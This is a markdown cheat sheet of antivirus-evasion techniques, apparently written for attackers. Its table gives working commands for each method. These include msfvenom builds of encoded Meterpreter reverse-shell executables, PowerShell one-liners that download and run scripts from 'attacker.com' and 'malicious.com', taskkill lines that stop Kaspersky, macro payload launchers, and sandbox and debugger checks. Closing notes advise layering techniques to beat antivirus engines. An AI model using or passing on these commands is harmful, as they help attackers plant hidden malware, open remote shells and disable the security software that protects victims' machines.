| **Category** | **Purpose** | **Tools/Command Examples** | **Notes** |
| --- | --- | --- | --- |
| **Obfuscation Techniques** | Make payloads harder for antivirus to detect | 1. **Metasploit (msfvenom)**: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -f exe > payload.exe`<br>2. **PowerShell**: `Invoke-Obfuscation` | Obfuscation scrambles the code or payload to make it harder for antivirus to recognize patterns. Tools like `msfvenom` have built-in encoders such as `x86/shikata_ga_nai`. PowerShell's `Invoke-Obfuscation` is designed for evasion. |
| **Payload Encoding** | Encode payloads to bypass signature-based detection | 1. **Metasploit**: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -f exe -o payload.exe`<br>2. **Veil-Evasion**: `veil-evasion`<br>3. **Hyperion**: `Hyperion.exe` | Payload encoding transforms the payload into a form that doesn't match known antivirus signatures. Tools like `Veil-Evasion` and `Hyperion` can help encode and pack payloads. |
| **PE (Portable Executable) Packing** | Pack executables to avoid detection by antivirus | 1. **UPX**: `upx --best --lzma payload.exe`<br>2. **Themida**: `Themida` (GUI)<br>3. **ASPack**: `ASPack` (GUI) | Packing modifies the file structure to obscure the contents. UPX is a commonly used tool, though it's often detected by AV engines. Themida and ASPack are more sophisticated commercial packers. |
| **Shellcode Injection** | Inject shellcode directly into memory | 1. **Reflective DLL Injection**: `Invoke-ReflectivePEInjection`<br>2. **PowerShell Injection**: `IEX (New-Object Net.WebClient).DownloadString('<http://attacker.com/payload.ps1>')` | Shellcode injection is a technique where shellcode is directly injected into memory, bypassing traditional file scanning. Reflective DLL injection is used to inject shellcode into a process. PowerShell injection can download and execute payloads. |
| **Avoiding Sandboxing** | Bypass detection from sandboxing and analysis systems | 1. **Detect Sandbox**: `if (Test-Path "C:\\Windows\\System32\\Sandbox") { exit }`<br>2. **In-memory payload execution**: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444` | Sandboxing tools attempt to detect malicious behavior by running code in an isolated environment. Using in-memory execution or testing for known sandbox indicators can prevent execution in these environments. |
| **Metasploit Evasion** | Evasion techniques using Metasploit framework | 1. **Meterpreter Staged Payload**: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -e x86/shikata_ga_nai`<br>2. **Stager and Stage (chained payload)** | Metasploit can generate payloads with various evasion techniques such as encoding and using different stages of payload execution. The Meterpreter reverse shell is commonly used for evasion. |
| **Disabling Antivirus** | Disable antivirus or security software detection and response | 1. **Taskkill**: `taskkill /F /IM avp.exe` (for Kaspersky)<br>2. **Service Management**: `sc stop [service_name]` | Disabling antivirus directly can sometimes be useful for bypassing detection, though it is more intrusive and noticeable. Targeting known antivirus processes or services can be effective in certain scenarios. |
| **Fileless Malware** | Avoid writing files to disk to evade file-based detection | 1. **PowerShell**: `Invoke-Expression (New-Object System.Net.WebClient).DownloadString('<http://malicious.com/payload.ps1>')`<br>2. **WMIC**: `wmic process call create 'cmd.exe /c <payload>'` | Fileless malware runs in memory and avoids triggering file-based antivirus scans. PowerShell and WMIC are useful tools for executing code directly in memory without leaving traces. |
| **Macro Exploitation** | Use macros in documents to deliver payloads | 1. **MS Word Macro**: `AutoOpen` macro to download a PowerShell script<br>2. **Excel Macro**: `Shell ("powershell.exe -command <payload>")` | Macros embedded in documents like Word or Excel files are a common delivery method. Disabling macro execution in Office software can help prevent this. |
| **Anti-Debugging** | Avoid being detected or analyzed by debugging tools | 1. **Check for Debuggers in Code**: `IsDebuggerPresent()`<br>2. **AVF Check (Anti-VM/Debugger)**: `if (Get-WmiObject -Class Win32_ComputerSystem).Model -eq 'VMware'` | Anti-debugging techniques allow malware to detect and avoid execution under analysis conditions, such as in a debugger or virtual machine. These checks can be bypassed using tools that disable debugger detection. |
| **Exploitation Frameworks** | Frameworks and tools specifically for payload evasion | 1. **Veil Framework**: `veil-evasion`<br>2. **Empire**: `powershell_import`<br>3. **Cobalt Strike**: `Beacon (staged)` | These frameworks are designed for post-exploitation and evasion. Veil is popular for creating AV evasion payloads, while Empire uses PowerShell scripts for similar purposes. Cobalt Strike's Beacon payload can be configured for AV bypass. |

### Additional Notes:

- **Layered Evasion:** Combining multiple evasion techniques (such as encoding + packing + PowerShell) may help improve success rates against AV engines.
- **Custom Evasion:** Sometimes creating custom payloads or modifying existing ones is required when standard evasion techniques do not work. Custom shellcode or manual modifications to the payload code may help bypass signature-based detection.
